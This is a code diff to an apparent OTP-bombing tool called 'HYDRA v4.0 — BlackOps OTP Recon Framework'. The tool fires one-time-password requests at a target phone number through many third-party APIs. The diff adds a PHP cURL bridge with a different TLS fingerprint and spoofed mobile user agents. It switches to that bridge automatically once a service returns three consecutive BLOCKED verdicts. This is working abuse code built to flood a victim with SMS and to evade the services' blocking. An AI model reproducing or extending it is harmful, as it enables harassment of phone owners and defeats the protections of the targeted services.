@@ -47,6 +47,32 @@ except ImportError:
     _AUTOSYNC_AVAILABLE = False
 
 # ─────────────────────────────────────────────
+#  PHASE 9 — PHP BRIDGE DETECTION
+#  Checks if PHP is installed and available.
+#  Used by fire_php_bridge() for alternate TLS stack.
+# ─────────────────────────────────────────────
+import subprocess as _subprocess
+
+def _detect_php() -> str:
+    """Return PHP version string or empty string if not found."""
+    for cmd in (["php", "--version"], ["php8", "--version"], ["php7", "--version"]):
+        try:
+            out = _subprocess.run(cmd, capture_output=True, text=True, timeout=4)
+            if out.returncode == 0:
+                first_line = out.stdout.strip().splitlines()[0]
+                return first_line  # e.g. "PHP 8.2.14 ..."
+        except Exception:
+            continue
+    return ""
+
+_PHP_AVAILABLE: str = _detect_php()   # cached at import time
+
+# Per-target consecutive BLOCKED counter  {target_name: int}
+# Resets when a non-BLOCKED verdict is received.
+# When count reaches 3 → auto-switch to PHP bridge (Phase 9.2)
+_php_block_counter: dict = {}
+
+# ─────────────────────────────────────────────
 #  COLORS
 # ─────────────────────────────────────────────
 RED    = "\033[91m"
@@ -1855,9 +1881,111 @@ def run_call_session(
 # ─────────────────────────────────────────────
 #  CORE FIRE FUNCTION
 # ─────────────────────────────────────────────
+def fire_php_bridge(phone: str, target: dict) -> dict:
+    """
+    Phase 9.1 — Fire via PHP cURL stack.
+    Different TLS fingerprint and HTTP stack vs Python requests.
+    Returns a result dict with verdict, status, resp_time_ms, body.
+    """
+    if not _PHP_AVAILABLE:
+        return {"verdict": "PHP_UNAVAILABLE", "status": "?", "resp_time_ms": 0, "body": ""}
+
+    fphone  = resolve_phone(phone, target.get("phone_format", "raw"))
+    url     = target["url"].replace("<PHONE>", fphone)
+    method  = target.get("method", "POST").upper()
+    ctype   = target.get("content_type", "json")
+    payload = target.get("payload") or {}
+
+    # Build payload string
+    if isinstance(payload, dict):
+        import copy as _copy
+        p = _copy.deepcopy(payload)
+        p_str = json.dumps(p).replace("<PHONE>", fphone)
+    else:
+        p_str = "{}"
+
+    # Build PHP cURL script
+    if method == "GET":
+        php_code = f"""<?php
+$ch = curl_init('{url}');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 8);
+curl_setopt($ch, CURLOPT_HTTPHEADER, ['User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36','Accept: application/json']);
+echo curl_exec($ch);
+?>"""
+    else:
+        ct_header = "application/x-www-form-urlencoded" if ctype == "form" else "application/json"
+        php_code = f"""<?php
+$data = '{p_str}';
+$ch = curl_init('{url}');
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 8);
+curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: {ct_header}','User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36','Accept: application/json']);
+echo curl_exec($ch);
+?>"""
+
+    t0 = time.time()
+    try:
+        proc = _subprocess.run(
+            ["php", "-r", php_code],
+            capture_output=True, text=True, timeout=12
+        )
+        elapsed_ms = int((time.time() - t0) * 1000)
+        body = (proc.stdout or "").strip()[:300]
+        # Classify using existing parser (HTTP status unknown from PHP, use 200 heuristic)
+        inferred_status = 200 if body else 503
+        verdict, cooldown = parse_body(body, inferred_status)
+        return {
+            "verdict":      verdict,
+            "status":       f"PHP/{inferred_status}",
+            "resp_time_ms": elapsed_ms,
+            "body":         body,
+            "cooldown":     cooldown,
+        }
+    except _subprocess.TimeoutExpired:
+        return {"verdict": "TIMEOUT", "status": "PHP/?", "resp_time_ms": 12000, "body": ""}
+    except Exception as e:
+        return {"verdict": f"PHP_ERROR", "status": "PHP/?", "resp_time_ms": 0, "body": str(e)}
+
+
 def fire(target: dict, phone: str, results_bucket: list, debug: bool = False, log_fn=None):
     """Send a single OTP request. Thread-safe. Calls log_fn(result) in real-time if provided."""
     try:
+        # ── Phase 9.2 — PHP Bridge auto-switch ───────────────────────
+        # Conditions for routing to PHP bridge:
+        #   a) Target explicitly tagged with "php_bridge": true, OR
+        #   b) Target has accumulated 3+ consecutive BLOCKED verdicts
+        _tname = target.get("name", "?")
+        _use_php = bool(_PHP_AVAILABLE) and (
+            target.get("php_bridge") or _php_block_counter.get(_tname, 0) >= 3
+        )
+        if _use_php:
+            br = fire_php_bridge(phone, target)
+            br["target"]   = _tname
+            br["category"] = target.get("category", "?")
+            br["phone"]    = phone
+            br["time"]     = datetime.now().strftime("%H:%M:%S")
+            br["via"]      = "PHP_BRIDGE"
+            br.setdefault("resp_time_ms", 0)
+            _ts_php = br["time"]
+            _cat_php = br["category"]
+            _v_php  = br["verdict"]
+            _color_php = (GREEN if _v_php == "OTP_SENT"
+                          else (YELLOW if "FAKE" in _v_php or "RATE" in _v_php else RED))
+            print(f"{_color_php}[{_ts_php}] {_tname:<15} [{_cat_php:<12}] {_v_php:<14}  {br['status']}  {br['resp_time_ms']}ms  [PHP]{RESET}")
+            # Update consecutive BLOCKED streak
+            if _v_php == "BLOCKED":
+                _php_block_counter[_tname] = _php_block_counter.get(_tname, 0) + 1
+            else:
+                _php_block_counter[_tname] = 0
+            results_bucket.append(br)
+            db_write(br, session_log["session_id"])
+            if log_fn:
+                log_fn(br)
+            return
+
         ua      = random.choice(USER_AGENTS)
         ts      = datetime.now().strftime("%H:%M:%S")
         method  = target.get("method", "POST").upper()
@@ -1987,6 +2115,12 @@ def fire(target: dict, phone: str, results_bucket: list, debug: bool = False, lo
         db_write(result, session_log["session_id"])
         if log_fn:
             log_fn(result)
+        # Phase 9.2 — track consecutive BLOCKEDs for PHP auto-switch
+        _name_key = target.get("name", "?")
+        if verdict == "BLOCKED":
+            _php_block_counter[_name_key] = _php_block_counter.get(_name_key, 0) + 1
+        else:
+            _php_block_counter[_name_key] = 0
 
     except requests.exceptions.Timeout:
         ts2 = datetime.now().strftime("%H:%M:%S")
@@ -2151,6 +2285,11 @@ def banner(total_targets: int = 0):
     print(f"{RESET}{CYAN}        HYDRA v4.0 — BlackOps OTP Recon Framework{RESET}")
     print(f"{DIM}        Targets: {count} APIs  |  Categories: e-commerce, healthcare,")
     print(f"        transport, finance, education, real-estate, food, grocery{RESET}")
+    # Phase 9 — PHP bridge status
+    if _PHP_AVAILABLE:
+        print(f"{GREEN}        [PHP bridge: AVAILABLE — {_PHP_AVAILABLE.split(' ')[0]} {_PHP_AVAILABLE.split(' ')[1] if len(_PHP_AVAILABLE.split(' ')) > 1 else ''}]{RESET}")
+    else:
+        print(f"{YELLOW}        [PHP bridge: NOT FOUND — install: winget install PHP.PHP]{RESET}")
     print(f"{RED}        ──────────────────────────────────────────────────{RESET}\n")
 
 
